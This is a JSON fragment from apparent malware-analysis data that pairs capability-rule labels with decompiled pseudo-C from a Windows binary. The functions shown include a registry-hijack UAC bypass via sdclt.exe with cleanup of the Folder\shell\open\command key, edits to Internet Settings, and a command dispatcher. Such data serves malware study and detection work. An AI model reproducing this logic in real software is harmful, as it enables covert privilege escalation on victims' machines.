        "decompiled_code": "\nuint fcn.0041313a(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpFilename;\n    uint lpString1;\n    uint pExecInfo;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint hProcess;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0041111b();\n    if (iVar1 != 1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x559cb0);\n        var_4h = 0;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&var_4h);\n        (*_sym.imp.KERNEL32.dll_IsWow64Process)(uVar2);\n        if (var_4h != 0) {\n            fcn.00410cff();\n        }\n        fcn.00412e91();\n        fcn.00401052(&lpFilename, 0, 0x400);\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0x400);\n        fcn.00412e2c(0x418fe6, &lpFilename);\n        fcn.00412e2c(\"DelegateExecute\", 0x418fe6);\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(&lpString1, 0x104);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, L\"\\\\sdclt.exe\");\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0x4176a8, &lpString1, 0, 0, 1);\n        var_34h = &lpString1;\n        pExecInfo = 0x3c;\n        var_40h = 0x40;\n        var_3ch = 0;\n        var_38h = 0x4176a8;\n        var_30h = *0x41a900;\n        uStack48 = *0x41a904;\n        uStack44 = *0x41a908;\n        uStack40 = *0x41a90c;\n        (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 0);\n        if (var_4h != 0) {\n            fcn.00410cd8();\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(2000);\n        (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(0x80000001, \"Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\");\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    return 0;\n}\n",
        "token_count": 653
    },
    "00413620": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00413620(int32_t *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint arg_10h;\n    int32_t unaff_ESI;\n    uchar *arg_8h_01;\n    uchar auStack16 [12];\n    \n    fcn.00415847(auStack16, arg_8h[2], 6);\n    if (unaff_ESI != 0) {\n        arg_8h_01 = &stack0xffffffe4;\n        fcn.0040315e(arg_8h_01);\n        fcn.00413605(arg_8h_01);\n        arg_8h_00 = *arg_8h + 8;\n        fcn.0040373f(arg_8h_00);\n        arg_10h = fcn.00413695(arg_8h_00);\n        fcn.00413594(**arg_8h, (*arg_8h)[1], arg_10h);\n    }\n    fcn.00403148();\n    return unaff_ESI != 0;\n}\n",
        "token_count": 242
    },
    "0041430e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041430e(void)\n\n{\n    fcn.0041178e();\n    if ((*0x559d90 != 0) && (*0x559d8c != 0)) {\n        fcn.00414c38(*0x559d8c);\n        *0x559d90 = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*0x559d94);\n    return;\n}\n",
        "token_count": 97
    },
    "00414345": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414345(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    \n    fcn.0041178e();\n    if (*0x559d90 == 0) {\n        if (*0x559d8c == 0) {\n            iVar1 = fcn.00406099();\n            if (iVar1 == 0) {\n                *0x559d8c = 0;\n            }\n            else {\n                *0x559d8c = fcn.00414e7b(extraout_ECX);\n            }\n        }\n        *0x559d88 = arg_8h;\n        *0x559d90 = 1;\n        fcn.00414cb1(arg_ch);\n    }\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*0x559d94);\n    return;\n}\n",
        "token_count": 195
    },
    "00414a12": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414a12(uint32_t param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *ppv;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uVar1 = fcn.004143ee();\n    if (uVar1 < param_1) {\n        param_1 = 0;\n    }\n    uVar1 = 0;\n    *param_2 = 0;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x417600, 0, 1, 0x41a77c, &ppv);\n    if ((ppv != NULL) && ((**(*ppv + 0xc))(ppv, 0x4175f0, &var_4h, 0),  var_4h != NULL)) {\n        (**(*var_4h + 0x14))(var_4h);\n        while( true ) {\n            var_8h = 0;\n            iVar2 = (**(*var_4h + 0xc))(var_4h, 1, &var_ch, &var_8h);\n            if (iVar2 != 0) break;\n            (**(*var_ch + 0x20))(var_ch, 0, 0, 0x4175a0, param_2);\n            if (*param_2 != 0) {\n                if (uVar1 == param_1) break;\n                uVar1 = uVar1 + 1;\n                fcn.00402562();\n            }\n        }\n        if (var_4h != NULL) {\n            (**(*var_4h + 8))(var_4h);\n            var_4h = NULL;\n        }\n        if (ppv != NULL) {\n            (**(*ppv + 8))(ppv);\n        }\n    }\n    return;\n}\n",
        "token_count": 427
    },
    "00414cb1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414cb1(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_ECX;\n    uint *puVar3;\n    uint *puVar4;\n    uint in_stack_fffffe8c;\n    uint var_c4h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_60h;\n    uchar auStack52 [4];\n    uint var_2ch;\n    uint var_28h;\n    uint var_22h;\n    \n    (*_sym.imp.ole32.dll_CoInitialize)();\n    (*_sym.imp.ole32.dll_CoCreateInstance)();\n    if (in_ECX[6] != NULL) {\n        (***in_ECX[6])();\n        if (in_ECX[7] != NULL) {\n            (**(*in_ECX[7] + 4))();\n            if (in_ECX + 8 != NULL) {\n                fcn.00414a12();\n            }\n            if (in_ECX[8] != 0) {\n                (*_sym.imp.ole32.dll_CoCreateInstance)();\n                piVar1 = in_ECX[9];\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0xc))();\n                    (**(*in_ECX[9] + 0xc))();\n                    fcn.00401052();\n                    (**(*in_ECX[6] + 0x10))();\n                    iVar2 = fcn.0041462f();\n                    in_ECX[10] = iVar2;\n                    if (iVar2 != 0) {\n                        iVar2 = fcn.0041464b();\n                        in_ECX[0xb] = iVar2;\n                        if (iVar2 != 0) {\n                            iVar2 = (**(*in_ECX[9] + 0x2c))();\n                            if (-1 < iVar2) {\n                                (**(*in_ECX[6] + 0x14))();\n                                fcn.0040102c(auStack52 + ((var_80h + 0x30) - var_80h) + -0x30, var_80h + 0x30, 0x28);\n                                fcn.00414492();\n                                fcn.00414ad1(arg_8h, var_28h, var_2ch, var_22h);\n                                fcn.00405de9();\n                                puVar3 = *(in_ECX[1] + arg_8h * 4);\n                                puVar4 = &stack0xfffffe8c;\n                                for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                    *puVar4 = *puVar3;\n                                    puVar3 = puVar3 + 1;\n                                    puVar4 = puVar4 + 1;\n                                }\n                                fcn.0041457f(in_stack_fffffe8c);\n                                iVar2 = fcn.0041462f();\n                                in_ECX[0xc] = iVar2;\n                                if (iVar2 != 0) {\n                                    (**(*in_ECX[6] + 0x24))(in_ECX[6], *in_ECX, 0);\n                                    (***in_ECX[9])(in_ECX[9], 0x4175e0, in_ECX + 0xd);\n                                    piVar1 = in_ECX[0xd];\n                                    if (piVar1 != NULL) {\n                                        (**(*piVar1 + 0x1c))(piVar1);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 810
    },
    "004154eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004154eb(void)\n\n{\n    code *pcVar1;\n    uchar *arg_8h;\n    uchar *puVar2;\n    uint extraout_ECX;\n    uchar *puStack1704;\n    uint uStack1700;\n    uint uStack1696;\n    char *pcStack1692;\n    uint uStack1688;\n    uchar *puStack1684;\n    uint uStack1680;\n    int32_t iVar3;\n    uint uStack1636;\n    uint uStack1632;\n    uint uStack1620;\n    uchar auStack1616 [4];\n    uint uStack1612;\n    int32_t iStack1600;\n    uint uStack1588;\n    uint uStack1580;\n    int32_t iStack1556;\n    int32_t iStack1552;\n    int32_t iStack1548;\n    int32_t iStack1544;\n    uint uStack1540;\n    uchar auStack1504 [16];\n    int32_t iStack1488;\n    uchar auStack1252 [8];\n    uchar auStack1244 [20];\n    uchar auStack1224 [1220];\n    \n    uStack1620 = 10;\n    uStack1612 = 0;\n    fcn.00405d37();\n    fcn.00412c11();\n    (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    fcn.004010ad();\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n    iVar3 = 0;\n    fcn.004134a2();\n    if (iVar3 == 0) goto code_r0x0041576e;\n    uStack1636 = 0;\n    fcn.00413279(0x215a, &stack0xfffff99c);\n    iVar3 = 0x20;\n    arg_8h = fcn.00401085();\n    puVar2 = arg_8h;\n    do {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    fcn.0040102c(arg_8h, &stack0xfffff99c, 4);\n    uStack1680 = 0x4155a6;\n    *0x559cb0 = (*_sym.imp.KERNEL32.dll_CreateEventA)();\n    uStack1680 = 0x4155b1;\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((iVar3 == 0xb7) || (*0x559cb0 == 0)) goto code_r0x0041576e;\n    uStack1680 = 0;\n    puStack1684 = NULL;\n    uStack1688 = 0;\n    pcStack1692 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\";\n    uStack1696 = 0x80000001;\n    uStack1700 = 0x4155eb;\n    (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegSetValueExA;\n    puStack1704 = &stack0xfffff97c;\n    uStack1700 = 4;\n    (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(uStack1680, \"MaxConnectionsPer1_0Server\", 0, 4);\n    puVar2 = &stack0xfffff964;\n    (*pcVar1)(puStack1704, \"MaxConnectionsPerServer\", 0, 4, puVar2, 4);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(puVar2);\n    fcn.00405b4e();\n    fcn.00412a7f(&stack0xfffff95c);\n    fcn.00405000(&stack0xfffff958, &stack0xfffff9b0);\n    fcn.00401052(&stack0xfffffb38, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, &stack0xfffffb38);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&stack0xfffffb24, L\"\\\\Microsoft Vision\\\\\");\n    (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(&stack0xfffffb1c, 0);\n    if (iStack1552 != 0) {\n        iVar3 = fcn.0041111b();\n        if (iVar3 != 1) {\n            iVar3 = fcn.00410a3c();\n            if (iVar3 == 10) {\n                fcn.0041313a();\n            }\n            else {\n                fcn.00412f55();\n            }\n        }\n    }\n    if (iStack1548 != 0) {\n        iVar3 = fcn.0041111b();\n        if (iVar3 == 1) {\n            fcn.00414f7e();\n        }\n    }\n    if (iStack1544 != 0) {\n        fcn.0040f073();\n    }\n    if (iStack1488 == 0) {\n        fcn.004126dc(uStack1588, uStack1580, uStack1540);\n        if (iStack1600 == 0) goto code_r0x0041574b;\n        uStack1632 = 0;\n        uStack1680 = 0x415725;\n        fcn.0040373f(&stack0xfffffa20);\n        puStack1684 = &stack0xfffff99c;\n        pcStack1692 = 0x415739;\n        uStack1680 = extraout_ECX;\n        fcn.004120f8(&stack0xfffff994, puStack1684);\n        pcStack1692 = 0x415742;\n        fcn.00405feb();\n        pcStack1692 = 0x415749;\n        fcn.00405feb();\n    }\n    else {\ncode_r0x0041574b:\n        if (iStack1556 != 0) {\n            fcn.00413eba();\n        }\n        fcn.00404f74();\n    }\n    fcn.00404c8d();\ncode_r0x0041576e:\n    fcn.0041267d();\n    fcn.00405d5c();\n    return 0;\n}\n",
        "token_count": 1397
    },
    "00415f28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00415f28(int32_t *arg_8h)\n\n{\n    int32_t unaff_ESI;\n    uchar *arg_8h_00;\n    uchar auStack16 [12];\n    \n    fcn.00415847(auStack16, arg_8h[2], 4);\n    if (unaff_ESI != 0) {\n        arg_8h_00 = &stack0xffffffe4;\n        fcn.0040315e(arg_8h_00);\n        fcn.00415f0d(arg_8h_00);\n        fcn.00415e9e(**arg_8h, (*arg_8h)[1]);\n    }\n    fcn.00403148();\n    return unaff_ESI != 0;\n}\n",
        "token_count": 173
    },
    "00401052": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint * fcn.00401052(uint *param_1, uchar param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    \n    if (param_3 != 0) {\n        puVar2 = param_1;\n        for (uVar1 = param_3 >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *puVar2 = CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            puVar2 = puVar2 + 1;\n        }\n        for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {\n            *puVar2 = param_2;\n            puVar2 = puVar2 + 1;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 206
    },
    "00405ee3": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405ee3(code **param_1, code **param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 0;\n    uVar2 = param_2 + (3 - param_1) >> 2;\n    if (param_2 < param_1) {\n        uVar2 = 0;\n    }\n    if (uVar2 != 0) {\n        do {\n            if (*param_1 != NULL) {\n                (**param_1)();\n            }\n            param_1 = param_1 + 1;\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < uVar2);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00406265": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00406265(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_1h;\n    \n    uVar1 = 0;\n    do {\n        *(&var_ch + uVar1) = *((-(uVar1 < 4) & 4) + 0x14 + param_2) >> (('\\x03' - (uVar1 & 3)) * '\\b' & 0x1f);\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 8);\n    var_1h._0_1_ = 0x80;\n    while( true ) {\n        fcn.0040630b(1);\n        if ((*(param_2 + 0x14) & 0x1f8) == 0x1c0) break;\n        var_1h._0_1_ = 0;\n    }\n    fcn.0040630b(8);\n    uVar1 = 0;\n    do {\n        *(uVar1 + param_1) = *(param_2 + (uVar1 & 0xfffffffc)) >> (('\\x03' - (uVar1 & 3)) * '\\b' & 0x1f);\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x14);\n    fcn.00401052(param_2, 0, 0x5c);\n    fcn.00401052(&var_ch, 0, 8);\n    return;\n}\n",
        "token_count": 386
    },
    "00413279": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413279(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    \n    iVar4 = (in_EDX >> 0x1f & 3U) + in_EDX >> 2;\n    puVar1 = in_ECX + iVar4 * 4;\n    for (iVar4 = -iVar4; iVar4 != 0; iVar4 = iVar4 + 1) {\n        arg_8h = (*(puVar1 + iVar4 * 4) * 0x16a88000 | *(puVar1 + iVar4 * 4) * -0x3361d2af >> 0x11) * 0x1b873593 ^\n                 arg_8h;\n        arg_8h = (arg_8h << 0xd | arg_8h >> 0x13) * 5 + 0xe6546b64;\n    }\n    uVar3 = 0;\n    uVar2 = in_EDX & 3;\n    if (uVar2 != 1) {\n        if (uVar2 != 2) {\n            if (uVar2 != 3) goto code_r0x004132f6;\n            uVar3 = puVar1[2] << 0x10;\n        }\n        uVar3 = uVar3 ^ puVar1[1] << 8;\n    }\n    arg_8h = arg_8h ^ ((*puVar1 ^ uVar3) * 0x16a88000 | (*puVar1 ^ uVar3) * -0x3361d2af >> 0x11) * 0x1b873593;\ncode_r0x004132f6:\n    uVar2 = ((arg_8h ^ in_EDX) >> 0x10 ^ arg_8h ^ in_EDX) * -0x7a143595;\n    uVar2 = (uVar2 >> 0xd ^ uVar2) * -0x3d4d51cb;\n    *arg_ch = uVar2 >> 0x10 ^ uVar2;\n    return;\n}\n",
        "token_count": 513
    },
    "004010b7": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t fcn.004010b7(void)\n\n{\n    *0x426640 = *0x426640 * 0x343fd + 0x269ec3;\n    return *0x426640 >> 0x10 & 0x7fff;\n}\n",
        "token_count": 60
    },
    "0040eb14": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040eb14(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    code *in_EDX;\n    uint *puVar2;\n    int32_t iVar3;\n    uint var_214h;\n    int32_t var_208h;\n    uint var_c4h;\n    int32_t var_b0h;\n    uint var_9ch;\n    int32_t var_94h;\n    uint var_84h;\n    uint var_7ch;\n    uint32_t uBytes;\n    uint var_6ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_20h;\n    uint32_t var_1ch;\n    int32_t hMem;\n    uint *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    var_10h = 0x426970;\n    iVar3 = 1;\n    var_14h = NULL;\n    var_ch = 0;\n    if (*in_ECX == 0) {\n        iVar1 = fcn.0040eda9();\n        if (iVar1 == 0) {\n            return 0xc0000135;\n        }\n        puVar2 = *(var_208h + 0x14);\n        while ((puVar2 + -2 != var_208h + 0xc && (iVar3 != 0))) {\n            var_30h = puVar2[4];\n            var_28h = puVar2[6];\n            var_20h = puVar2 + 9;\n            fcn.0040ecb5();\n            iVar3 = (*in_EDX)(&var_30h, arg_8h);\n            puVar2 = *puVar2;\n        }\n    }\n    else {\n        if (*in_ECX != 1) {\n            return 0xc0000002;\n        }\n        var_20h = &var_1ch;\n        iVar1 = fcn.0040eda9();\n        if (iVar1 == 0) {\n            return 0xc0000135;\n        }\n        var_14h = &var_c4h;\n        iVar1 = fcn.0040ee24(0x28);\n        if (iVar1 == 0) {\n            return 0xc0000135;\n        }\n        while ((var_ch = var_b0h + -8,  var_ch != var_208h + 0xc && (iVar3 != 0))) {\n            var_14h = &var_9ch;\n            iVar3 = fcn.0040ee24(0x68);\n            var_b0h = var_94h;\n            if (iVar3 != 0) {\n                var_1ch = uBytes;\n                var_30h = var_84h;\n                var_28h = var_7ch;\n                hMem = var_6ch;\n                hMem = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, uBytes >> 0x10);\n                var_b0h = var_94h;\n                if (hMem != 0) {\n                    var_ch = var_6ch;\n                    var_14h = hMem;\n                    iVar1 = fcn.0040ee24(var_1ch >> 0x10);\n                    if (iVar1 != 0) {\n                        fcn.0040ecb5();\n                        iVar3 = (*in_EDX)(&var_30h, arg_8h);\n                    }\n                    (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n                    var_b0h = var_94h;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 820
    },
    "00401612": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401612(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00406099();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                piVar1[2] = 0;\n                piVar1[3] = 0;\n                piVar1 = piVar1 + 3;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 2;\n            piVar2 = NULL;\n            do {\n                piVar4 = (-8 - var_8h) + piVar1 + *in_ECX;\n                piVar1[-2] = *piVar4;\n                fcn.00403549(piVar4 + 1);\n                fcn.00403549(piVar4 + 2);\n                piVar2 = piVar2 + 1;\n                piVar1 = piVar1 + 3;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            for (iVar5 = (*in_ECX)[-1]; iVar5 != 0; iVar5 = iVar5 + -1) {\n                fcn.00401468();\n            }\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    var_8h[in_ECX[2] * 3] = arg_8h;\n    fcn.00403549(&arg_ch);\n    fcn.00403549(&arg_10h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00401468();\n    return;\n}\n",
        "token_count": 584
    },
    "004140e1": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004140e1(uint arg_8h, uint noname_1, uint noname_2, uint arg_14h, uint noname_4, uint noname_5, uint noname_6, \n            int32_t arg_24h, int32_t arg_28h)\n\n{\n    ushort uStack64;\n    int32_t iStack62;\n    uint uStack58;\n    uint uStack54;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    ushort uStack36;\n    ushort uStack34;\n    uint uStack32;\n    int32_t iStack28;\n    \n    uStack48 = 0x28;\n    uStack36 = 1;\n    uStack34 = 0x18;\n    uStack32 = 0;\n    iStack28 = arg_28h * arg_24h * 3;\n    iStack44 = arg_24h;\n    iStack40 = arg_28h;\n    uStack54 = 0x36;\n    uStack64 = 0x4d42;\n    arg_28h = ((arg_24h + 1) * 3 & 0xfffffffcU) * arg_28h;\n    iStack62 = arg_28h + 0x36;\n    uStack58 = 0;\n    fcn.004030cc(&uStack64, 0xe);\n    fcn.004030cc(&uStack58 + 2, 0x28);\n    fcn.004030cc(arg_8h, arg_28h);\n    fcn.00405044(&stack0xffffffa8);\n    fcn.00403148();\n    fcn.00414f0a();\n    return;\n}\n",
        "token_count": 386
    },
    "null": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00404cd7": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404cd7(int32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t in_ECX;\n    \n    if (arg_ch != NULL) {\n        if (arg_8h < 0x23) {\n            if (arg_8h == 0x22) {\n                fcn.0040290e(arg_ch);\n            }\n            else if (arg_8h < 0x11) {\n                if (arg_8h == 0x10) {\n                    fcn.00402b36();\n                }\n                else if (arg_8h < 9) {\n                    if (arg_8h == 8) {\n                        fcn.00402d20();\n                    }\n                    else if (arg_8h == 0) {\n                        fcn.00402e27();\n                    }\n                    else if (arg_8h == 2) {\n                        fcn.00402dc9();\n                    }\n                    else if (arg_8h == 4) {\n                        fcn.00402d82();\n                    }\n                    else if (arg_8h == 6) {\n                        fcn.00402d2f();\n                    }\n                }\n                else if (arg_8h == 10) {\n                    fcn.00402c31();\n                }\n                else if (arg_8h == 0xc) {\n                    fcn.00402bdc();\n                }\n                else if (arg_8h == 0xe) {\n                    fcn.00402b4b();\n                }\n            }\n            else if (arg_8h < 0x1b) {\n                if (arg_8h == 0x1a) {\n                    fcn.00402a9c();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                if (arg_8h == 0x12) {\n                    fcn.00402aee();\n                }\n                else if (arg_8h == 0x14) {\n                    fcn.00414345(in_ECX, arg_ch[1]);\n                }\n                else if (arg_8h == 0x16) {\n                    fcn.0041430e();\n                }\n                else if (arg_8h == 0x18) {\n                    fcn.00402ac6();\n                }\n            }\n            else if (arg_8h == 0x1c) {\n                fcn.00402a0a();\n            }\n            else if (arg_8h == 0x1e) {\n                fcn.00415a43(arg_ch);\n            }\n            else if (arg_8h == 0x20) {\n                fcn.0040c09d(in_ECX);\n            }\n        }\n        else if (arg_8h < 0x36) {\n            if (arg_8h == 0x35) {\n                fcn.00402aa3();\n            }\n            else if (arg_8h < 0x2d) {\n                if (arg_8h == 0x2c) {\n                    fcn.0040d1c8();\n                }\n                else if (arg_8h == 0x24) {\n                    fcn.0040906f(in_ECX, 0);\n                }\n                else if (arg_8h == 0x26) {\n                    fcn.00409029();\n                }\n                else if (arg_8h == 0x28) {\n                    fcn.0040e29a(in_ECX, *(in_ECX + 0x238));\n                }\n                else if (arg_8h == 0x2a) {\n                    fcn.00402895(arg_ch);\n                }\n            }\n            else if ((arg_8h != 0x2e) && (arg_8h == 0x30)) {\n                fcn.004027ff(arg_ch);\n            }\n        }\n        else if (arg_8h == 0x38) {\n            fcn.004027c1(arg_ch);\n        }\n        else if (arg_8h == 0x3a) {\n            fcn.0040278b();\n        }\n        else if (arg_8h == 0x3c) {\n            fcn.00402774();\n        }\n        else if (arg_8h == 0x42) {\n            fcn.0040cf1b();\n        }\n        else if (arg_8h == 0x44) {\n            fcn.004026bb(arg_ch);\n        }\n        else if (arg_8h == 0x48) {\n            fcn.0040264d();\n        }\n        else if (arg_8h == 0x4a) {\n            fcn.00402cbb();\n        }\n        (***arg_ch)(1);\n    }\n    return;\n}\n",
        "token_count": 1061
    },
    "00405aae": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405aae(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uchar *arg_8h_00;\n    uint arg_ch;\n    uint arg_10h;\n    uint *arg_8h_01;\n    uint var_ch;\n    \n    fcn.00402f87(&var_ch, **(in_ECX + 0x4c) + 4, (*(in_ECX + 0x50) - **(in_ECX + 0x4c)) + -4);\n    arg_8h_01 = &var_ch;\n    fcn.0040315e(arg_8h_01);\n    arg_8h_00 = &stack0xffffffc8;\n    arg_ch = extraout_ECX;\n    arg_10h = extraout_ECX;\n    fcn.00405a61(&stack0xffffffc8);\n    fcn.004061f0(arg_8h_00, arg_ch, arg_10h, arg_8h_01);\n    fcn.00403148();\n    return arg_8h;\n}\n",
        "token_count": 249
    },
    "00401eb2": {
        "rules": [
